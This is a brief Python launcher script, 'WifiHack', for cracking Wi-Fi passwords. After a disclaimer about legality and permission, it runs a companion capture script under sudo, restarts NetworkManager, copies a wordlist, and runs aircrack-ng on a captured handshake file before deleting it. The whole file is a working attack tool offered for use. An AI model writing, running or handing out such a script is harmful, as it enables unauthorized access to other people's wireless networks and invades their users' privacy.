import os
os.system("clear")
print("WifiHack")
print("Made by Phoenix Techh")
print("")
print("\tPlease note that I am not responsible for how this WiFi hack is used. It is important to use caution and only use it on devices that you have permission to hack. \n \tHacking into someone else's network without permission is illegal and unethical, and it is not recommended under any circumstances. \n\tThe WiFi hack can also be dangerous, as it may compromise the security of the network and the privacy of the users. \n\tUse it at your own risk and always be mindful of the potential consequences.")
print("")
input("Press Enter to Continue ")
os.system("sudo python3 part1.py")
os.system("sudo rm hack1*")
os.system("systemctl restart NetworkManager")
os.system("clear")
os.system("cp wifite.txt password.txt")
os.system("clear")
print("Readdy to crack")
input("Press Enter to Continue ")
os.system("aircrack-ng hackpass-01.cap -w password.txt")
os.system("sudo rm hackpass*")

